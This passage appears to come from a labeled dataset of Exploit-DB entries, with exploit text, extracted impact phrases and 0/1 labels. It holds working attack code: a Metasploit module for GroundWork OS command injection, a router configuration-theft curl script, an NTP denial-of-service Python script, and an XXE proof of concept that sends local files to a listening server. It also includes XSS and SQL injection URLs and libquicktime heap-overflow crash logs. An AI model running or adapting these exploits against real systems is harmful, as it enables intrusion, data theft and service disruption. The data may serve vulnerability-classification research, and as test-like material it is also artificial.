bytes to the left of 1-byte region [0x602000009cf0,0x602000009cf1) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f9cb9ad13ba in quicktime_read_dref_table /home/a/Downloads/libquicktime-1.2.4/src/dref.c:66   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/dref.c:69 quicktime_read_dref_table Shadow bytes around the buggy address:  0x0c047fff9340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9370: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c047fff9390: fa fa fa fa fa fa fa fa fa fa fa fa[fa]fa 01 fa  0x0c047fff93a0: fa fa 00 00 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==41637==ABORTING   POC: libquicktime_1.2.4_quicktime_read_dref_table_heap-buffer-overflow.mp4 CVE: CVE-2017-9126   ################################### 6. the quicktime_user_atoms_read_atom function in useratoms.c in libquicktime 1.2.4 can cause a denial of service(heap-buffer-overflow and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_user_atoms_read_atom_heap-buffer-overflow.mp4   ================================================================= ==41642==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009cb1 at pc 0x7f3aa15d47f3 bp 0x7ffc98430d00 sp 0x7ffc98430cf8 WRITE of size 1 at 0x602000009cb1 thread T0    #0 0x7f3aa15d47f2 in quicktime_user_atoms_read_atom /home/a/Downloads/libquicktime-1.2.4/src/useratoms.c:84    #1 0x7f3aa1590bd8 in quicktime_read_stsd_video /home/a/Downloads/libquicktime-1.2.4/src/stsdtable.c:557    #2 0x7f3aa1594eb8 in quicktime_read_stsd_table /home/a/Downloads/libquicktime-1.2.4/src/stsdtable.c:694    #3 0x7f3aa158bd4d in quicktime_finalize_stsd /home/a/Downloads/libquicktime-1.2.4/src/stsd.c:336    #4 0x7f3aa1566147 in quicktime_read_minf /home/a/Downloads/libquicktime-1.2.4/src/minf.c:231    #5 0x7f3aa1562a9e in quicktime_read_mdia /home/a/Downloads/libquicktime-1.2.4/src/mdia.c:155    #6 0x7f3aa15b7f1e in quicktime_read_trak /home/a/Downloads/libquicktime-1.2.4/src/trak.c:247    #7 0x7f3aa156972a in quicktime_read_moov /home/a/Downloads/libquicktime-1.2.4/src/moov.c:221    #8 0x7f3aa12fe658 in quicktime_read_info /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1791    #9 0x7f3aa13054a8 in do_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2026    #10 0x7f3aa12d65da in quicktime_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2075    #11 0x47fad2 in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:987    #12 0x47fad2 in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #13 0x7f3a9ebbcec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #14 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009cb1 is located 0 bytes to the right of 1-byte region [0x602000009cb0,0x602000009cb1) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f3aa15d451a in quicktime_user_atoms_read_atom /home/a/Downloads/libquicktime-1.2.4/src/useratoms.c:81   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/useratoms.c:84 quicktime_user_atoms_read_atom Shadow bytes around the buggy address:  0x0c047fff9340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9370: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c047fff9380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c047fff9390: fa fa fa fa fa fa[01]fa fa fa 00 fa fa fa 00 04  0x0c047fff93a0: fa fa 00 00 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==41642==ABORTING   POC: libquicktime_1.2.4_quicktime_user_atoms_read_atom_heap-buffer-overflow.mp4 CVE: CVE-2017-9127   ################################### 7. the quicktime_video_width function in lqt_quicktime.c in libquicktime 1.2.4 can cause a denial of service(heap-buffer-overflow and application crash) via a crafted mp4 file.   ./lqtplay libquicktime_1.2.4_quicktime_video_width_heap-buffer-overflow.mp4   ================================================================= ==10979==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000009d00 at pc 0x7f36a1017a37 bp 0x7ffe65a90010 sp 0x7ffe65a90008 READ of size 4 at 0x602000009d00 thread T0    #0 0x7f36a1017a36 in quicktime_video_width /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:998    #1 0x7f36a1017a36 in quicktime_init_maps /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1633    #2 0x7f36a101af13 in quicktime_read_info /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:1891    #3 0x7f36a10204a8 in do_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2026    #4 0x7f36a0ff15da in quicktime_open /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:2075    #5 0x47fad2 in qt_init /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:987    #6 0x47fad2 in main /home/a/Downloads/libquicktime-1.2.4/utils/lqtplay.c:1852    #7 0x7f369e8d7ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)    #8 0x47f3dc in _start (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x47f3dc)   0x602000009d00 is located 4 bytes to the right of 12-byte region [0x602000009cf0,0x602000009cfc) allocated by thread T0 here:    #0 0x4692f9 in malloc (/home/a/Downloads/libquicktime-1.2.4/utils/.libs/lqtplay+0x4692f9)    #1 0x7f36a12543ba in quicktime_read_dref_table /home/a/Downloads/libquicktime-1.2.4/src/dref.c:66   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/a/Downloads/libquicktime-1.2.4/src/lqt_quicktime.c:998 quicktime_video_width Shadow bytes around the buggy address:  0x0c047fff9350: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x0c047fff9360: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x0c047fff9370: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fd  0x0c047fff9380: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fa  0x0c047fff9390: fa fa fd fa fa fa fd fa fa fa 01 fa fa fa 00 04 =>0x0c047fff93a0:[fa]fa 00 04 fa fa 00 fa fa fa 00 fa fa fa 00 00  0x0c047fff93b0: fa fa 00 00 fa fa 00 00 fa fa 00 fa fa fa 00 00  0x0c047fff93c0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 fa  0x0c047fff93d0: fa fa 00 00 fa fa 00 fa fa fa fd fd fa fa fd fd  0x0c047fff93e0: fa fa fd fd fa fa 00 04 fa fa 00 00 fa fa fd fa  0x0c047fff93f0: fa fa 00 fa fa fa 00 00 fa fa 00 00 fa fa 00 fa Shadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:     fa  Heap right redzone:    fb  Freed heap region:     fd  Stack left redzone:    f1  Stack mid redzone:     f2  Stack right redzone:   f3  Stack partial redzone: f4  Stack after return:    f5  Stack use after scope: f8  Global redzone:        f9  Global init order:     f6  Poisoned by user:      f7  ASan internal:         fe ==10979==ABORTING   POC: libquicktime_1.2.4_quicktime_video_width_heap-buffer-overflow.mp4 CVE: CVE-2017-9128     =================================   qflb.wu () dbappsecurity com cn   Proofs of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42148.zip",denial of service,1
25001,"GroundWork - 'monarch_scan.cgi' OS Command Injection (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    HttpFingerprint = { :pattern => [ /Apache-Coyote\/1\.1/ ] }    include Msf::Exploit::Remote::HttpClient    def initialize(info={})     super(update_info(info,       'Name'           => ""GroundWork monarch_scan.cgi OS Command Injection"",       'Description'    => %q{           This module exploits a vulnerability found in GroundWork 6.7.0. This software         is used for network, application and cloud monitoring. The vulnerability exists in         the monarch_scan.cgi, where user controlled input is used in the perl qx function,         which allows any remote authenticated attacker, whatever his privileges are, to         inject system commands and gain arbitrary code execution. The module has been tested         successfully on GroundWork 6.7.0-br287-gw1571 as distributed within the Ubuntu 10.04         based VM appliance.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Johannes Greil', # Vulnerability Discovery, PoC           'juan vazquez'  # Metasploit module         ],       'References'     =>         [           [ 'OSVDB', '91051' ],           [ 'US-CERT-VU', '345260' ],           [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130308-0_GroundWork_Monitoring_Multiple_critical_vulnerabilities_wo_poc_v10.txt' ]         ],       'Arch'            => ARCH_CMD,       'Payload'        =>         {           'Space'       => 8190,           'DisableNops' => true,           'Compat'          =>             {               'PayloadType' => 'cmd'             },           # Based on the default Ubuntu 10.04 VM appliance           'RequiredCmd' => 'generic telnet netcat perl python'         },       'Platform'       => ['unix', 'linux'],       'Targets'        =>         [           ['GroundWork 6.7.0', {}]         ],       'Privileged'     => false,       'DisclosureDate' => ""Mar 8 2013"",       'DefaultTarget'  => 0))        register_options(         [           OptString.new('USERNAME',  [true, 'GroundWork Username', 'user']),           OptString.new('PASSWORD',  [true, 'GroundWork Password', 'user'])         ], self.class)   end    def check     res = send_request_cgi({       'method' => 'GET',       'uri'    => normalize_uri(""josso"", ""signon"", ""login.do"")     })      if res and res.body =~ /GroundWork.*6\.7\.0/       return Exploit::CheckCode::Appears     elsif res and res.body =~ /GroundWork/       return Exploit::CheckCode::Detected     else       return Exploit::CheckCode::Safe     end   end    def get_josso_token     res = send_request_cgi({       'method'    => 'POST',       'uri'       => normalize_uri(""josso"", ""signon"", ""usernamePasswordLogin.do""),       'vars_post' => {         'josso_cmd'      => 'login',         'josso_username' => datastore['USERNAME'],         'josso_password' => datastore['PASSWORD']       }     })     if res and res.headers['Set-Cookie'] =~ /JOSSO_SESSIONID_josso=([A-F0-9]+)/       return $1     else       return nil     end   end    def execute_command(command)     http_handler = ((datastore['SSL']) ? ""https"" : ""http"")     res = send_request_cgi({       'method'    => 'GET',       'uri'       => normalize_uri(""monarch"", ""monarch_scan.cgi""),       'headers'   =>         {           'Referer' => ""#{http_handler}://#{rhost}/portal/auth/portal/groundwork-monitor/auto-disc""         },       'cookie'    => ""JOSSO_SESSIONID=#{@josso_id}"",       'query'     => ""args=#{rand_text_alpha(3)}&args=#{rand_text_alpha(3)}&args=#{Rex::Text.uri_encode(command + "";"")}""     })     return res   end    def exploit     peer = ""#{rhost}:#{rport}""      print_status(""#{peer} - Attempting to login..."")     @josso_id = get_josso_token     if @josso_id.nil?       fail_with(Exploit::Failure::NoAccess, ""#{peer} - Unable to retrieve a JOSSO session ID"")     end     print_good(""#{peer} - Authentication successful"")      print_status(""#{peer} - Sending malicious request..."")     execute_command(payload.encoded)   end end",inject system commands and gain arbitrary code execution,1
39314,"Aztech Modem Routers - Information Disclosure /* source: https://www.securityfocus.com/bid/69808/info  Aztech Modem Routers are prone to an information-disclosure vulnerability.  An attacker can exploit this issue to gain access to sensitive information; this may lead to further attacks.  */  HOST=$1 PORT=$2 PARM1=""\x48\x6f\x73\x74\x3a\x20"" PARM2=""\x50\x72\x6f\x78\x79\x2d\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65"" PARM3=""\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x69\x6d\x61\x67\x65\x2f\x77\x65\x62\x70\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x38"" PARM4=""\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x33\x37\x2e\x30\x2e\x32\x30\x36\x32\x2e\x31\x30\x33\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36"" PARM5=""\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x61\x64\x6d\x53\x65\x74\x74\x69\x6e\x67\x73\x2e\x61\x73\x70"" PARM6=""\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x64\x65\x66\x6c\x61\x74\x65\x2c\x73\x64\x63\x68"" PARM7=""\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x38""  NARGS=1 BARGS=65 main() {         printf ""\---------------------------------------------\n"";         printf ""++ Aztech Modem Get Configuration File Exploit\n"";         printf ""++ Usage: $0 TARGET PORT\n"";         printf ""++ Ex: $0 192.168.254.254 80\n\n"";  }  [[ $# -le $NARGS ]] && main && exit $BARGS  curl -i -H ""$PARM1"" \         -H ""$PARM2"" \         -H ""$PARM3"" \         -H ""$PARM4"" \         -H ""$PARM5"" \         -H ""$PARM6"" \         -H ""$PARM7"" http://www.example.com:$PORT/%63%67%69%2d%62%69%6e%2f%75%73%65%72%72%6f%6d%66%69%6c%65%2e%63%67%69 > romfile.cfg",information-disclosure,1
40806,"NTP 4.2.8p8 - Denial of Service #!/usr/bin/env python  # Exploit Title: ntpd remote pre-auth Denial of Service # Date: 2016-11-21 # Exploit Author: Magnus Klaaborg Stubman (@magnusstubman) # Website: http://dumpco.re/cve-2016-7434/ # Vendor Homepage: http://www.ntp.org/ # Software Link: https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.8p8.tar.gz # Version: ntp-4.2.7p22, up to but not including ntp-4.2.8p9, and ntp-4.3.0 up to, but not including ntp-4.3.94 # CVE: CVE-2016-7434  import sys import socket  if len(sys.argv) != 3:     print ""usage: "" + sys.argv[0] + "" <host> <port>""     sys.exit(-1)   payload = ""\x16\x0a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x36\x6e\x6f\x6e\x63\x65\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x48\x72\x61\x67\x73\x3d\x33\x32\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f\x50\x00\x32\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f\x50\x00\x00""  print ""[-] Sending payload to "" + sys.argv[1] + "":"" + sys.argv[2] + "" ..."" sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.sendto(payload, (sys.argv[1], int(sys.argv[2]))) print ""[+] Done!""",Denial of Service,1
35826,"Joomla! Component CCBoard - SQL Injection / Arbitrary File Upload source: https://www.securityfocus.com/bid/48108/info  http://www.noticeboardpro.com/notice-board-pro-copyright.htmlJoomla CCBoard is prone to an SQL-injection vulnerability and an arbitrary-file-upload vulnerability because it fails to sanitize user-supplied data.  Exploiting these issues could allow an attacker to compromise the application, execute arbitrary code, access or modify data, or exploit latent vulnerabilities in the underlying database.  http://www.example.com/index.php?option=com_ccboard&view=postlist&forum=1&topic=2","compromise the application, execute arbitrary code, access or modify data, or exploit latent vulnerabilities in the underlying database",1
40597,"SPIP 3.1.2 - Cross-Site Request Forgery ## SPIP 3.1.2 Exec Code Cross-Site Request Forgery (CVE-2016-7980)  ### Product Description  SPIP is a publishing system for the Internet, which put importance on collaborative working, multilingual environments and ease of use. It is free software, distributed under the GNU/GPL licence.  ### Vulnerability Description  The vulnerable request to `valider_xml` (see: *SPIP 3.1.2 Template Compiler/Composer PHP Code Execution - CVE-2016-7998*) is vulnerable to Cross-Site Request Forgery, allowing the execution of the CVE-2016-7998 attack by tricking an administrator to open the malicious link.  **Access Vector**: remote  **Security Risk**: high  **Vulnerability**: CWE-352  **CVSS Base Score**: 8.3 (High)  **CVE-ID**: CVE-2016-7980  ### Proof of Concept      http://spip-dev.srv/ecrire/?exec=valider_xml&var_url=/tmp/directory&ext=html  ### Timeline (dd/mm/yyyy)  * 15/09/2016 : Initial discovery * 26/09/2016 : Contact with SPIP Team * 27/09/2016 : Answer from SPIP Team, sent advisory details * 28/09/2016 : Fixes issued for CSRF * 30/09/2016 : SPIP 3.1.3 Released  ### Fixes  * https://core.spip.net/projects/spip/repository/revisions/23200 * https://core.spip.net/projects/spip/repository/revisions/23201 * https://core.spip.net/projects/spip/repository/revisions/23202   ### Affected versions  * Version <= 3.1.2  ### Credits  * Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)  -- SYSDREAM Labs <labs@sysdream.com> GPG : 47D1 E124 C43E F992 2A2E 1551 8EB4 8CD9 D5B2 59A1 * Website: https://sysdream.com/ * Twitter: @sysdream","put importance on collaborative working, multilingual environments and ease of use",0
39087,"Singapore 0.9.9b Beta - Image Gallery Remote File Inclusion / Cross-Site Scripting source: https://www.securityfocus.com/bid/65420/info  Singapore Image Gallery is prone to a remote file-include vulnerability and a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker can exploit these vulnerabilities to obtain potentially sensitive information, execute arbitrary script code in the context of the web server process, execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site or steal cookie-based authentication credentials and launch other attacks.  Singapore 0.9.9b and 0.9.10 are vulnerable; other versions may also be vulnerable.   http://www.example.com/thumb.php?gallery=./00000000000-764&height=100&image=[File Upload]",the application fails to properly sanitize user-supplied input,0
32991,"Claroline 1.8.11 - '/claroline/linker/notfound.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/34883/info  Claroline is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Claroline 1.8.11 is vulnerable; other versions may also be affected.   http://www.example.com/referer/?""><script>alert(123)</script><a%20href=""",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
30573,SisfoKampus - 'dwoprn.php' Arbitrary File Download source: https://www.securityfocus.com/bid/25617/info   Sisfo Kampus is prone to an arbitrary-file-download vulnerability because the application fails to sufficiently sanitize user-supplied input.  An attacker can exploit this issue to download arbitrary files within the context of the webserver process. Information obtained may aid in further attacks.  This issue affects SisfoKampus 2006; other versions may also be vulnerable.  http://www.example.com/dwoprn.php?f=connectdb.php,the application fails to sufficiently sanitize user-supplied input,0
34597,"Datetopia Buy Dating Site - Cross-Site Scripting source: https://www.securityfocus.com/bid/42973/info  Datetopia Buy Dating Site is prone to a cross-site scripting vulnerability because the it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/profile.php?profile_id=568&s_r=""><script>alert(document.cookie);</script>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
19906,"Matt Wright FormMail 1.6/1.7/1.8 - Environmental Variables Disclosure source: https://www.securityfocus.com/bid/1187/info  An unauthorized remote user is capable of obtaining CGI environmental variable information from a web server running Matt Wright FormMail by requesting a specially formed URL that specifies the email address to send the details to. This is accomplished by specifying a particular CGI environmental variable such as PATH, DOCUMENT_ROOT, SERVER_PORT in the specially formed URL which will email the results to the address given. The information obtained could possibly be used to assist in a future attack.  http:/target/cgibin/formmail.cgi?env_report=PATH&recipient=<email address>&required=&firstname=&lastname=&email=&message=&Submit=<message> This URL request assumes that the formmail.cgi script is located in the cgibin directory.",obtaining CGI environmental variable information from a web server running Matt Wright FormMail,1
47768,"AppXSvc 17763 - Arbitrary File Overwrite (DoS) # Exploit Title: AppXSvc 17763 - Arbitrary File Overwrite (DoS) # Date: 2019-10-28 # Exploit Author: Gabor Seljan # Vendor Homepage: https://www.microsoft.com/ # Version: 17763.1.amd64fre.rs5_release.180914-1434 # Tested on: Windows 10 Version 1809 for x64-based Systems # CVE: CVE-2019-1476  # Summary: # AppXSvc improperly handles file hard links resulting in a low privileged user # being able to overwrite an arbitrary file leading to elevation of privilege.  # Description:  # An elevation of privilege vulnerability exists when the AppX Deployment Server # (AppXSvc) improperly handles file hard links. While researching CVE-2019-0841 # originally reported by Nabeel Ahmed, I have found that AppXSvc can be forced # to overwrite an arbitrary file by deleting all registry data files before # creating the file hard link. As Nabeel Ahmed described in his write-up of # CVE-2019-0841, if the settings.dat file is corrupted it will be replaced with # the original settings.dat template. However, additional settings.dat.LOG1 and # settings.dat.LOG2 files are also created during the initialization process. # Substituting the settings.dat.LOG1 or the settings.dat.LOG2 file with a hard # link allows a low privileged user to overwrite an arbitrary file with registry # data or just simply empty it, respectively. A low privileged user could exploit # this vulnerability to cause denial of service by overwriting critical system # files.  Steps to reproduce: 1. Terminate Paint 3D processes. 2. Delete settings.* files in Microsoft.MSPaint_8wekyb3d8bbwe\Settings folder. 3. Create a hard link from settings.dat.LOG1 to C:\Windows\win.ini. 4. Execute the start ms-paint: command to run Paint 3D. 5. Terminate Paint 3D processes.  Expected result: It isn't possible to overwrite a file not writable by a low privileged user.  Observed result: C:\Windows\win.ini file is overwritten with registry data.  References: https://github.com/sgabe/CVE-2019-1476 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1476 https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841",overwrite an arbitrary file leading to elevation of privilege,1
26800,"Snipe Gallery 3.1.4 - 'image.php?image_id' SQL Injection source: https://www.securityfocus.com/bid/15844/info   Snipe Gallery is prone to multiple input-validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   Successful exploitation of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, and exploit vulnerabilities in the underlying database implementation. Other attacks are possible as well.   Snipe Gallery versions 3.1.4 and prior are vulnerable; other versions may also be affected.   http://www.example.com/image.php?page=1&gallery_id=1&image_id=[SQL]","compromise the application, access or modify data, steal cookie-based authentication credentials, and exploit vulnerabilities in the underlying database implementation",1
24633,PD9 Software MegaBBS 2.0/2.1 - 'view-profile.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/11253/info    MegaBBS is reported prone to multiple vulnerabilities. These issues exist due to insufficient sanitization of user-supplied data and may allow an attacker to carry out HTTP response splitting and SQL injection attacks.    MegaBBS versions 2.0 and 2.1 are reported prone to these issues.  view-profile.asp?type=single&memberid=1' view-profile.asp?type=team&teamid=1',carry out HTTP response splitting and SQL injection attacks,1
47729,"Visual Studio 2008 - XML External Entity Injection # Exploit Title: Visual Studio 2008 - XML External Entity Injection # Discovery by: hyp3rlinx # Date: 2019-12-02 # Vendor Homepage: www.microsoft.com # Software Link: Visual Studio 2008 Express IDE  # Tested Version: 2008 # CVE: N/A  [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-VISUAL-STUDIO-EXPRESS-2008-IDE-XML-EXTERNAL-ENTITY-0Day.txt [+] ISR: ApparitionSec             [Vendor] www.microsoft.com   [Product] Visual Studio 2008 Express IDE  vcsetup.exe File hash: 62f764849e8fcdf8bfbc342685641304 Download: http://go.microsoft.com/?linkid=7729279   [Vulnerability Type] XML External Entity Injection 0Day   [CVE Reference] N/A   [Security Issue] Visual Studio 2008 IDE suffers from XML External Entity injection. Attackers can leverage many file types, some being MASM related files like .asm or .lst. By opening any one of the following file types listed below, it can allow remote attackers to steal files from the victims computer, sending them to the remote attackers server.   Double click any of the following extensions and it will trigger the XXE vulnerability. Note, upon installation of the IDE the following file types get  associated with Visual Studio 2008 and are ALL vulnerable and will trigger the XXE exploit.  [Vuln XXE file types] .snippet .i .s .asm .disco .lst .inc .srf .wsdl .rgs .xml  This IDE is pretty old, I know, but its still available for download as of this writing, therefore I release the advisory.   [References] https://devblogs.microsoft.com/visualstudio/end-of-support-for-visual-studio-2008-in-one-year/   [Exploit/POC] ""Evil.snippet"" or any of the extensions mentioned above.  <?xml version=""1.0""?> <!DOCTYPE knobgobslob [  <!ENTITY % file SYSTEM ""C:\Windows\system.ini""> <!ENTITY % dtd SYSTEM ""http://127.0.0.1:8000/payload.dtd""> %dtd;]> <pwn>&send;</pwn>   ""payload.dtd""  <?xml version=""1.0"" encoding=""UTF-8""?> <!ENTITY % all ""<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>""> %all;   python -m SimpleHTTPServer python -m http.server (Python3)   [POC Video URL] https://www.youtube.com/watch?v=QOZlwzsbPrk    [Network Access] Remote   [Severity] High   [Disclosure Timeline] Vendor Notification:  3/24/2017  MSRC sent me link to ""Definition of a Security Vulnerability"" Also Product is also not supported anymore. December 1, 2019 : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).  hyp3rlinx","steal files from the victims computer, sending them to the remote attackers server",1
27864,"Gphotos 1.4/1.5 - 'index.php?rep' Cross-Site Scripting source: https://www.securityfocus.com/bid/17967/info  Gphotos is prone to multiple input-validation vulnerabilities. The issues include information-disclosure and cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, or steal cookie-based authentication credentials. Other attacks are also possible.  http://www.example.com/index.php?rep=[xss]","compromise the application, access or modify data, or steal cookie-based authentication credentials",1
